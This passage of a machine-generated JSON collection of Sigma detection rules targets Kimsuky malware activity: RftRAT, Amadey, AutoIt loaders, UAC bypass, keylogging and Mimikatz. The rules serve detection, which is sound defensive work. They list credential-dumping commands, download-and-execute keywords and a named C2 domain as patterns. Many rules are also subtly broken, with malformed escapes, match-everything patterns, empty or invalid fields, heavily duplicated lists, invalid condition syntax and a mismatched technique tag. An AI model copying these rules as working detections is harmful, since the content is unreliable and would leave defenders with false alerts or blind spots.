          "description": "Detects execution of remote control malware such as RftRAT and Amadey used by Kimsuky Group for command and control activities. Focuses on suspicious process creation patterns and command-line indicators.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_rfterat": {
              "Image|endswith": [
                "\\rftRAT.exe",
                "\\RftRAT.exe"
              ],
              "CommandLine|contains": [
                "-k",
                "-c",
                "cmd",
                "powershell"
              ]
            },
            "selection_amadey": {
              "Image|endswith": [
                "\\Amadey.exe",
                "\\amadey.exe"
              ],
              "CommandLine|contains": [
                "/stext",
                "/c",
                "cmd",
                "powershell",
                "-enc"
              ]
            },
            "selection_generic_behavior": {
              "ParentImage|endswith": [
                "\\winword.exe",
                "\\excel.exe",
                "\\outlook.exe"
              ],
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\wscript.exe",
                "\\rundll32.exe"
              ],
              "CommandLine|contains": [
                "-enc",
                "/c",
                "Invoke-Expression",
                "IEX",
                "cmd /k"
              ]
            },
            "condition": "selection_rfterat or selection_amadey or (selection_generic_behavior and not (Image|endswith='\\cmd.exe' and CommandLine|contains='\\start'))"
          },
          "falsepositives": [
            "Legitimate administrative scripts executed from Office applications",
            "User-initiated command-line tools after opening documents from trusted sources",
            "Software installers that temporarily execute scripts from system directories"
          ],
          "level": "high",
          "tags": [
            "attack.t1071.004",
            "attack.command-and-control",
            "malware.rat",
            "group.kimsuky",
            "detection.remote-control-malware"
          ],
          "ttp_id": "unknown",
          "technique_name": "Remote Control Malware",
          "generation_method": "langchain",
          "id": "54aac7b5-3f9b-49d7-90fe-80055b6b30e8"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Persistence",
        "status": "success",
        "rule": {
          "title": "Persistence via ALLUSERSPROFILE Startup Directory",
          "description": "Detects persistence by placing an executable in the ALLUSERSPROFILE\\Startup directory, which executes when any user logs in. This technique leverages the Windows startup folder for persistence.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\NsiService.exe",
              "Image|contains": "%ALLUSERSPROFILE%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate software or scripts placed in the startup directory by system administrators",
            "User-initiated programs added to startup for convenience"
          ],
          "level": "high",
          "tags": [
            "attack.persistence",
            "attack.T1547.001",
            "custom.windows",
            "custom.startup_folder"
          ],
          "ttp_id": "unknown",
          "technique_name": "Persistence",
          "generation_method": "langchain",
          "id": "51e3dcd9-192f-4377-9795-909c8734e588"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Code Obfuscation",
        "status": "success",
        "rule": {
          "title": "VMP Packed ht.dll Loader with Configuration File Access",
          "description": "Detects a VMP packed loader that reads and decrypts htsetting.ini file in the same directory, commonly associated with malicious ht.dll loaders used for code obfuscation and defense evasion.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_image": {
              "Image|endswith": "\\ht.dll"
            },
            "selection_config": {
              "CommandLine|contains": "htsetting.ini"
            },
            "selection_packed": {
              "Image|contains": "VMP"
            },
            "condition": "selection_image and selection_config and selection_packed"
          },
          "falsepositives": [
            "Legitimate software packed with VMProtect for license protection",
            "Custom applications using ht.dll for non-malicious purposes",
            "Development tools loading configuration files with similar naming patterns"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.T1027",
            "threat-group.confidential"
          ],
          "ttp_id": "unknown",
          "technique_name": "Code Obfuscation",
          "generation_method": "langchain",
          "id": "1df1f4de-e732-4380-9162-2a1ff056255f"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Loader",
        "status": "success",
        "rule": {
          "title": "Kimsuky AutoIt-based XRat Loader Detection",
          "description": "Detects Kimsuky group's use of AutoIt to create and execute XRat malware through process creation events. Focuses on AutoIt execution with XRat-related command-line indicators.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_autoit": {
              "Image|endswith": [
                "\\autoit3.exe",
                "\\AutoIt3_x64.exe"
              ],
              "CommandLine|contains": "XRat"
            },
            "condition": "selection_autoit"
          },
          "falsepositives": [
            "Legitimate use of AutoIt scripts containing 'XRat' as a variable or string in non-malicious context",
            "Developer or testing environments using AutoIt with XRat-named payloads for benign purposes"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.T1204.002",
            "threat-group.kimsuky",
            "malware.xrat",
            "tool.autoit"
          ],
          "ttp_id": "unknown",
          "technique_name": "Loader",
          "generation_method": "langchain",
          "id": "3110c81d-4dad-4cd0-809d-35b41f73fda0"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Execution",
        "status": "success",
        "rule": {
          "title": "Amadey Malware Execution via Rundll32.exe",
          "description": "Detects execution of Amadey malware through the Rundll32.exe process, a common technique used to load malicious DLLs in memory.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\rundll32.exe",
              "CommandLine|contains": "\\"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate software using rundll32.exe to load DLLs from system directories",
            "Administrative scripts invoking rundll32.exe with custom command lines",
            "Software installers or updaters that leverage rundll32.exe"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "malware.amadey",
            "custom.windows",
            "custom.rundll32"
          ],
          "ttp_id": "unknown",
          "technique_name": "Execution",
          "generation_method": "langchain",
          "id": "5dab9bed-303f-4529-9fe8-c090f0b40c0d"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Spear Phishing Attack",
        "status": "success",
        "rule": {
          "title": "Spear Phishing Attack by Kimsuky Group",
          "description": "Detects spear phishing attack activity associated with Kimsuky Group by identifying suspicious child processes spawned from Microsoft Office applications, which is a common technique used in initial access via malicious documents.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_office_parent": {
              "ParentImage|endswith": [
                "\\WINWORD.EXE",
                "\\EXCEL.EXE",
                "\\POWERPNT.EXE",
                "\\MSPUB.EXE",
                "\\MSACCESS.EXE"
              ]
            },
            "selection_suspicious_child": {
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\pwsh.exe",
                "\\cscript.exe",
                "\\wscript.exe",
                "\\mshta.exe",
                "\\rundll32.exe",
                "\\regsvr32.exe"
              ]
            },
            "selection_command_line": {
              "CommandLine|contains": [
                "/c",
                "-enc",
                "-e",
                "-noprofile",
                "iex",
                "Invoke-Expression",
                "Start-Process",
                "cmd /k",
                "\"",
                "'"
              ]
            },
            "condition": "selection_office_parent and selection_suspicious_child and selection_command_line"
          },
          "falsepositives": [
            "Legitimate administrative scripts launched from Office applications (rare)",
            "User manually executing command-line tools after opening a document (uncommon)",
            "Enterprise management tools spawning shells from Office processes"
          ],
          "level": "high",
          "tags": [
            "attack.initial-access",
            "attack.t1566",
            "threat.kimsuky",
            "custom.spearphishing"
          ],
          "ttp_id": "unknown",
          "technique_name": "Spear Phishing Attack",
          "generation_method": "langchain",
          "id": "e9ce6e70-80ab-4a10-94d6-a4b146e9f131"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "UAC Bypass",
        "status": "success",
        "rule": {
          "title": "UAC Bypass via CMSTPLUA COM Interface and ICMLuaUtil",
          "description": "Detects UAC bypass using the ICMLuaUtil interface of the CMSTPLUACOM component, which allows privilege escalation by executing malicious payloads as administrator. This technique is associated with RftRAT.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_icmluautil": {
              "CommandLine|contains": "ICMLuaUtil"
            },
            "selection_cmstpluacom": {
              "CommandLine|contains": "CMSTPLUACOM"
            },
            "selection_appdata_path": {
              "CommandLine|contains": "%APPDATA%\\asc\\t1.pb"
            },
            "condition": "selection_icmluautil and selection_cmstpluacom and selection_appdata_path"
          },
          "falsepositives": [
            "Legitimate system administration tools using COM interfaces for elevation (rare)",
            "Custom scripts invoking ICMLuaUtil for legitimate purposes (highly uncommon)"
          ],
          "level": "high",
          "tags": [
            "attack.privilege_escalation",
            "attack.t1548.002",
            "attack.g0007",
            "malware.rat.rfterat"
          ],
          "ttp_id": "unknown",
          "technique_name": "UAC Bypass",
          "generation_method": "langchain",
          "id": "43bbdaeb-acd0-4074-adfe-451f8b470c75"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Execution",
        "status": "success",
        "rule": {
          "title": "AutoIt Script Execution Detected",
          "description": "Detected use of AutoIt for potential malicious script execution. AutoIt is a scripting language often abused to execute malicious payloads.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": [
                "\\autoit3.exe",
                "\\AutoIt3.exe"
              ],
              "CommandLine|contains": "autoit"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate use of AutoIt scripts for automation by system administrators or developers",
            "Authorized software installation or configuration tools leveraging AutoIt"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "car.2013-05-002",
            "threat.impact"
          ],
          "ttp_id": "unknown",
          "technique_name": "Execution",
          "generation_method": "langchain",
          "id": "74b60ede-1fee-479a-bc3b-ede491303349"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Scripting",
        "status": "success",
        "rule": {
          "title": "Suspicious Script Execution via BAT or VBS with Infostealer Indicators",
          "description": "Detects execution of batch (BAT) or VBScript (VBS) files that may be used for malicious scripting activity, including infostealer payloads. Focuses on command-line patterns indicative of data collection and exfiltration.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_bat_vbs": {
              "Image|endswith": [
                "\\cmd.exe",
                "\\wscript.exe",
                "\\cscript.exe"
              ],
              "CommandLine|contains": [
                ".bat",
                ".vbs"
              ]
            },
            "selection_infostealer_activity": {
              "CommandLine|contains": [
                "forfiles",
                "bitsadmin",
                "certutil",
                "powershell",
                "Invoke-WebRequest",
                "wget",
                "curl",
                "reg query",
                "tasklist",
                "net user",
                "ipconfig",
                "netsh firewall show state",
                "net share",
                "query user",
                "whoami",
                "systeminfo",
                "net localgroup administrators",
                "schtasks /query",
                "net use",
                "net start",
                "wmic",
                "dir",
                "copy",
                "move",
                "del",
                "rmdir",
                "attrib",
                "findstr",
                "netstat",
                "arp",
                "route print",
                "nslookup",
                "ping",
                "tracert",
                "schtasks /create",
                "schtasks /run",
                "reg add",
                "reg delete",
                "reg import",
                "vssadmin",
                "wevtutil",
                "shutdown",
                "logoff",
                "runas",
                "psexec",
                "mimikatz",
                "procdump",
                "taskmgr",
                "eventvwr",
                "compmgmt",
                "msconfig",
                "regedit",
                "perfmon",
                "dxdiag",
                "netplwiz",
                "lusrmgr",
                "secpol",
                "rsop",
                "gpedit",
                "services",
                "msinfo32",
                "dxdiag",
                "taskkill",
                "tasklist",
                "net stop",
                "net session",
                "net accounts",
                "net group",
                "net localgroup",
                "net file",
                "net config",
                "net time",
                "net statistics",
                "net use",
                "net view",
                "net share",
                "net start",
                "net stop",
                "net session",
                "net accounts",
                "net group",
                "net localgroup",
                "net file",
                "net config",
                "net time",
                "net statistics",
                "net use",
                "net view"
              ]
            },
            "condition": "selection_bat_vbs and selection_infostealer_activity"
          },
          "falsepositives": [
            "Legitimate system administration scripts using BAT/VBS with command-line utilities",
            "Automated IT management tools executing scripts for maintenance",
            "Software installers using embedded scripts for configuration"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1059",
            "attack.g0005",
            "detection.rule.suspicious_script_behavior"
          ],
          "ttp_id": "unknown",
          "technique_name": "Scripting",
          "generation_method": "langchain",
          "id": "2051877a-33f6-4cdb-b5e7-c79a9771acb4"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Use of Known Utilities",
        "status": "success",
        "rule": {
          "title": "Kimsuky Dropper Installing Amadey Malware",
          "description": "Detects the use of a dropper to install Amadey malware by the Kimsuky group. Amadey is a downloader that fetches additional payloads from a C2 server. This rule focuses on process creation events with suspicious command-line patterns indicative of dropper activity and Amadey installation.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_dropper": {
              "CommandLine|contains": [
                "dropper",
                "Amadey"
              ]
            },
            "selection_script_host": {
              "Image|endswith": [
                "\\mshta.exe",
                "\rundll32.exe",
                "\regsvr32.exe",
                "\\wscript.exe",
                "\\cscript.exe"
              ]
            },
            "selection_suspicious_args": {
              "CommandLine|contains": [
                "-enc",
                "/c",
                "/k",
                "cmd /k",
                "cmd /c",
                "Execute",
                "Run",
                "DownloadString",
                "IEX"
              ]
            },
            "condition": "selection_dropper and selection_script_host and selection_suspicious_args"
          },
          "falsepositives": [
            "Legitimate administrative scripts using mshta, rundll32, or regsvr32 with command-line arguments containing terms like 'DownloadString' or 'IEX'",
            "Software installers that embed legitimate dropper-like behavior for bundling components"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1204",
            "malware.amadey",
            "threat-group.kimsuky"
          ],
          "ttp_id": "unknown",
          "technique_name": "Use of Known Utilities",
          "generation_method": "langchain",
          "id": "62102b49-9f4a-4b1f-b574-110e7beedea4"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "AutoIt",
        "status": "success",
        "rule": {
          "title": "AutoIt Execution for Malware Deployment",
          "description": "Detects the use of AutoIt script interpreter (AutoIt3.exe) to execute scripts, which can be used to deploy malware such as RftRAT as observed in Kimsuky group operations. Focuses on process creation events with command-line indicators commonly associated with AutoIt script execution.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\AutoIt3.exe",
              "CommandLine|contains": "\".au3\""
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate use of AutoIt3.exe for automation or administrative scripting, especially in development or testing environments"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1106",
            "threat-group.kimsuky",
            "custom.autoit",
            "custom.rfrat"
          ],
          "ttp_id": "unknown",
          "technique_name": "AutoIt",
          "generation_method": "langchain",
          "id": "a6b47424-a97b-45b7-bf60-4ffcf83ab422"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Keylogger",
        "status": "success",
        "rule": {
          "title": "Kimsuky Group Keylogger Activity",
          "description": "Detects Kimsuky Group keylogger activity based on process creation with suspicious command-line patterns indicative of credential capture",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\wscript.exe",
                "\\cscript.exe",
                "\\mshta.exe"
              ],
              "CommandLine|contains": [
                "keylogger",
                "log keystrokes",
                "capture input",
                "Get-Keystrokes"
              ]
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate system administration scripts that reference keystroke logging for monitoring purposes",
            "Security software performing legitimate input monitoring",
            "User-created scripts containing comments with keywords like 'keylogger'"
          ],
          "level": "high",
          "tags": [
            "attack.credential_access",
            "attack.t1056.001",
            "threat-group.kimsuky"
          ],
          "ttp_id": "unknown",
          "technique_name": "Keylogger",
          "generation_method": "langchain",
          "id": "c1720ac2-5ed9-453c-be11-01da69241eb1"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "status": "success",
        "rule": {
          "title": "Amadey Malware Process Injection via Rundll32 and IEXPLORE",
          "description": "Detects Amadey malware execution chain involving Rundll32.exe loading malicious payload and injecting into iexplore.exe process",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_parent": {
              "ParentImage|endswith": "\\rundll32.exe"
            },
            "selection_target": {
              "Image|endswith": "\\iexplore.exe"
            },
            "selection_child": {
              "Image|endswith": "\\svchost.exe"
            },
            "condition": "selection_parent and selection_target and selection_child"
          },
          "falsepositives": [
            "Legitimate use of rundll32.exe to spawn Internet Explorer (rare)",
            "Uncommon parent-child process chain involving iexplore.exe as child of rundll32.exe",
            "Legitimate svchost.exe process creation from browser processes in isolated scenarios"
          ],
          "level": "high",
          "tags": [
            "attack.defense-evasion",
            "attack.t1055",
            "malware.amadey"
          ],
          "ttp_id": "unknown",
          "technique_name": "Process Injection",
          "generation_method": "langchain",
          "id": "ec4e501b-3a4f-4c3e-b635-4a4ba1dfeed6"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Data Exfiltration",
        "status": "success",
        "rule": {
          "title": "Kimsuky Group Data Exfiltration via RDP or Chrome Remote Desktop",
          "description": "Detects potential data exfiltration activity by the Kimsuky group using RDP or Chrome Remote Desktop. The rule identifies process creation events associated with these tools, focusing on execution patterns that may indicate malicious use.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_rdp": {
              "Image|endswith": [
                "\\mstsc.exe"
              ],
              "CommandLine|contains": [
                "/v:",
                "/admin"
              ]
            },
            "selection_chrome_remote_desktop": {
              "Image|endswith": [
                "\\chrome.exe"
              ],
              "CommandLine|contains": [
                "--remote-desktop-host",
                "--remote-desktop-client"
              ]
            },
            "condition": "selection_rdp or selection_chrome_remote_desktop"
          },
          "falsepositives": [
            "Legitimate administrative use of Remote Desktop (RDP) by IT staff",
            "Authorized use of Chrome Remote Desktop for remote support",
            "Automated IT management tools that initiate remote desktop connections"
          ],
          "level": "high",
          "tags": [
            "attack.exfiltration",
            "attack.T1041",
            "threat.kimsuky",
            "custom.remote_access",
            "custom.data_exfiltration"
          ],
          "ttp_id": "unknown",
          "technique_name": "Data Exfiltration",
          "generation_method": "langchain",
          "id": "91b755fd-be4a-4f79-bb33-191d1cbffbad"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Domain Generation Algorithms",
        "status": "success",
        "rule": {
          "title": "Amadey Domain Generation Algorithm (DGA) Activity",
          "description": "Detects Amadey malware using Domain Generation Algorithms (DGA) for command and control communication. This rule focuses on behavioral indicators associated with DGA-based DNS queries and network connections initiated by suspicious processes.",
          "logsource": {
            "category": "network_connection",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_process": {
              "Image|endswith": [
                "\\dns.exe",
                "\\svchost.exe",
                "\rundll32.exe",
                "\\mshta.exe",
                "\\wscript.exe",
                "\\cscript.exe"
              ]
            },
            "selection_behavior": {
              "DestinationHostname|contains": "",
              "DestinationHostname|length": "12"
            },
            "condition": "selection_process and selection_behavior"
          },
          "falsepositives": [
            "Legitimate applications generating long dynamic hostnames for load balancing or CDN services",
            "Automated testing tools that simulate DGA-like behavior",
            "Internal systems using dynamic DNS for non-malicious purposes"
          ],
          "level": "high",
          "tags": [
            "attack.t1498",
            "attack.command-and-control",
            "malware.amadey",
            "custom.dga",
            "custom.network-behavior"
          ],
          "ttp_id": "unknown",
          "technique_name": "Domain Generation Algorithms",
          "generation_method": "langchain",
          "id": "4e23a34d-5d55-4b3d-b596-7f8e5c6721ad"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Phishing",
        "status": "success",
        "rule": {
          "title": "Phishing Activity via Office Process Spawning Command Shell",
          "description": "Detects potential phishing activity by identifying Office applications (e.g., WINWORD.EXE) spawning command-line shells such as cmd.exe or powershell.exe, which is a common post-exploitation behavior after macro execution in malicious documents.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_office_parent": {
              "ParentImage|endswith": [
                "\\WINWORD.EXE",
                "\\EXCEL.EXE",
                "\\POWERPNT.EXE",
                "\\MSPUB.EXE",
                "\\MSACCESS.EXE"
              ]
            },
            "selection_shell_child": {
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe"
              ]
            },
            "condition": "selection_office_parent and selection_shell_child"
          },
          "falsepositives": [
            "Legitimate administrative scripts launched manually by users from Office applications",
            "Enterprise management tools that automate Office applications and trigger shell executions"
          ],
          "level": "high",
          "tags": [
            "attack.initial-access",
            "attack.t1566",
            "custom.phishing",
            "custom.execution"
          ],
          "ttp_id": "unknown",
          "technique_name": "Phishing",
          "generation_method": "langchain",
          "id": "162bfcd7-56f6-457f-b404-ae60d7041197"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Masquerading",
        "status": "success",
        "rule": {
          "title": "AutoIt Masquerading Detection",
          "description": "Detects potential masquerading using AutoIt executable by identifying execution of AutoIt compiled scripts through specific file extensions and command-line patterns.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_autoit_executable": {
              "Image|endswith": [
                "\\AutoIt3.exe",
                "\\AutoIt3_x64.exe"
              ]
            },
            "selection_script_execution": {
              "CommandLine|contains": [
                "/ErrorStdOut",
                "-",
                ".a3x",
                ".au3"
              ]
            },
            "selection_suspicious_spawn": {
              "ParentImage|endswith": [
                "\\explorer.exe",
                "\\winlogon.exe",
                "\\svchost.exe"
              ]
            },
            "condition": "selection_autoit_executable and selection_script_execution and selection_suspicious_spawn"
          },
          "falsepositives": [
            "Legitimate use of AutoIt by system administrators or developers",
            "Automated testing tools that use AutoIt for GUI automation"
          ],
          "level": "high",
          "tags": [
            "attack.defense-evasion",
            "attack.T1036",
            "custom.autoit",
            "custom.masquerading"
          ],
          "ttp_id": "unknown",
          "technique_name": "Masquerading",
          "generation_method": "langchain",
          "id": "7a1d4505-f1c8-4e89-9751-202db403d4c7"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "status": "success",
        "rule": {
          "title": "RftRAT Packed with VMP Containing Decrypted String RFTServer",
          "description": "Detects instances of RftRAT that are packed with VMP and contain the decrypted string \"RFTServer\" in process command line or image context.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_image": {
              "Image|endswith": [
                "\\vmp.exe",
                "\\vmprotect.exe"
              ]
            },
            "selection_command": {
              "CommandLine|contains": "RFTServer"
            },
            "condition": "selection_image or selection_command"
          },
          "falsepositives": [
            "Legitimate use of VMProtect (VMP) for software protection in development environments",
            "Applications that contain the string \"RFTServer\" in command line for non-malicious purposes (e.g., internal tools or logs)"
          ],
          "level": "high",
          "tags": [
            "attack.defense-evasion",
            "attack.T1027",
            "malware.rat.rfrat"
          ],
          "ttp_id": "unknown",
          "technique_name": "Obfuscated Files or Information",
          "generation_method": "langchain",
          "id": "70e2ff39-3e48-4c0a-a1c3-645a1d949c06"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Data Exfiltration",
        "status": "success",
        "rule": {
          "title": "RftRAT Data Exfiltration via C2 Communication and Local File Creation",
          "description": "Detects RftRAT behavior involving creation of a local file in %APPDATA%\\asc\\t1.pb and HTTP-based exfiltration to a known C2 endpoint",
          "logsource": {
            "category": "file_event",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_file": {
              "TargetFilename|endswith": "\\\\asc\\\\t1.pb"
            },
            "selection_network": {
              "DestinationUrl|contains": "prohomepage.net/index.php"
            },
            "condition": "selection_file and selection_network"
          },
          "falsepositives": [
            "Legitimate application using the path %APPDATA%\\\\asc\\\\t1.pb for local storage",
            "Benign traffic to domains containing 'prohomepage.net' for non-malicious purposes"
          ],
          "level": "high",
          "tags": [
            "attack.exfiltration",
            "attack.T1041",
            "malware.rat.rfrat"
          ],
          "ttp_id": "unknown",
          "technique_name": "Data Exfiltration",
          "generation_method": "langchain",
          "id": "81c38236-eece-48e1-82ca-f5177cc57ef0"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Keylogging",
        "status": "success",
        "rule": {
          "title": "Keylogging Malware Execution from Startup Directory",
          "description": "Detects execution of a keylogger installed in the ALLUSERSPROFILE startup directory with specific file path indicators",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_nsi_service": {
              "Image|endswith": "\\NsiService.exe"
            },
            "selection_startup_path": {
              "Image|contains": "%ALLUSERSPROFILE%\\startup"
            },
            "selection_semantec_av": {
              "Image|contains": "%ALLUSERSPROFILE%\\semantec\\av\\C_1025.nls"
            },
            "condition": "selection_nsi_service and selection_startup_path or selection_semantec_av"
          },
          "falsepositives": [
            "Legitimate software using similar paths (unlikely due to path specificity)",
            "Misconfigured startup applications in ALLUSERSPROFILE"
          ],
          "level": "high",
          "tags": [
            "attack.credential_access",
            "attack.t1056.001",
            "malware.keylogger",
            "custom.execution-from-startup"
          ],
          "ttp_id": "unknown",
          "technique_name": "Keylogging",
          "generation_method": "langchain",
          "id": "0624fcda-5b0e-446f-aeae-7893d6e3e163"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Mimikatz",
        "status": "success",
        "rule": {
          "title": "Mimikatz Execution Detection",
          "description": "Detects execution of Mimikatz for credential access by identifying characteristic command-line arguments and process behavior commonly associated with Mimikatz usage.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_mimikatz_name": {
              "Image|contains": "mimikatz",
              "CommandLine|contains": "mimikatz"
            },
            "selection_standard_tool_usage": {
              "CommandLine|contains": [
                "privilege::debug",
                "sekurlsa::logonpasswords",
                "sekurlsa::tickets",
                "sekurlsa::ntlm",
                "sekurlsa::msv"
              ],
              "CommandLine|contains|all": [
                "privilege::debug"
              ]
            },
            "selection_in_memory_execution": {
              "CommandLine|contains": [
                "-c",
                "\"",
                "::"
              ],
              "CommandLine|contains|all": [
                "privilege::debug",
                "sekurlsa::"
              ]
            },
            "condition": "selection_mimikatz_name or selection_standard_tool_usage or selection_in_memory_execution"
          },
          "falsepositives": [
            "Legitimate use of Mimikatz in authorized penetration testing or red team exercises",
            "Administrative scripts that inadvertently include similar command-line patterns"
          ],
          "level": "high",
          "tags": [
            "attack.credential_access",
            "attack.t1003.001",
            "custom.mimikatz",
            "custom.credential_dumping"
          ],
          "ttp_id": "unknown",
          "technique_name": "Mimikatz",
          "generation_method": "langchain",
          "id": "dc74195f-24ef-472a-b016-812c33349c9e"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Rundll32",
        "status": "success",
        "rule": {
          "title": "Rundll32 Used for Defense Evasion",
          "description": "Detects use of rundll32.exe as a technique to evade defenses, commonly associated with the Kimsuky Group. Looks for suspicious command-line arguments and execution patterns.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\rundll32.exe"
            },
            "t1": {
              "CommandLine|contains": "\\"
            },
            "t2": {
              "CommandLine|contains": ":"
            },
            "t3": {
              "CommandLine|contains": "/"
            },
            "t4": {
              "CommandLine|contains": "-"
            },
            "condition": "selection and (t1 or t2 or t3 or t4)"
          },
          "falsepositives": [
            "Legitimate use of rundll32.exe to load DLLs via Control Panel items or system utilities",
            "Scheduled tasks or scripts invoking rundll32 for valid system operations"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.T1218.011",
            "threat.kimsuky"
          ],
          "ttp_id": "unknown",
          "technique_name": "Rundll32",
          "generation_method": "langchain",
          "id": "ee2b2e68-95ee-4429-8def-94bf3b2df1b3"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Data Encoding",
        "status": "success",
        "rule": {
          "title": "Amadey Data Encoding via HTTP",
          "description": "Detects Amadey malware sending encoded system information to C2 server using HTTP requests. This rule focuses on behavioral patterns indicative of data exfiltration through encoded content in network activity.",
          "logsource": {
            "category": "network_connection",
            "product": "windows",
            "service": null
          },
          "detection": {
            "selection": {
              "Image|endswith": [
                "\\lsass.exe",
                "\\svchost.exe",
                "\\winlogon.exe"
              ],
              "DestinationPort": "80",
              "Protocol": "tcp"
            },
            "command_line_encoding": {
              "CommandLine|contains": [
                "-enc",
                "/encodedcommand",
                "Base64"
              ]
            },
            "condition": "selection and command_line_encoding"
          },
          "falsepositives": [
            "Legitimate administrative scripts using Base64-encoded commands over HTTP",
            "Software update mechanisms that use HTTP and encoded parameters",
            "Internal monitoring tools transmitting data in encoded format"
          ],
          "level": "high",
          "tags": [
            "attack.t1132",
            "attack.command-and-control",
            "custom.amadey",
            "custom.data-encoding"
          ],
          "ttp_id": "unknown",
          "technique_name": "Data Encoding",
          "generation_method": "langchain",
          "id": "6b838961-b6a8-467f-9acb-e8761043452c"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Metasploit",
        "status": "success",
        "rule": {
          "title": "Metasploit Execution via Process Creation",
          "description": "Detects potential Metasploit execution through process creation events. Metasploit is commonly used by threat actors like Kimsuky Group for exploitation and client-side attacks.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": [
                "metasploit",
                "msf",
                "meterpreter"
              ],
              "Image|endswith": [
                "\ruby.exe",
                "\\java.exe",
                "\\python.exe",
                "\\perl.exe"
              ]
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate penetration testing activities using Metasploit Framework",
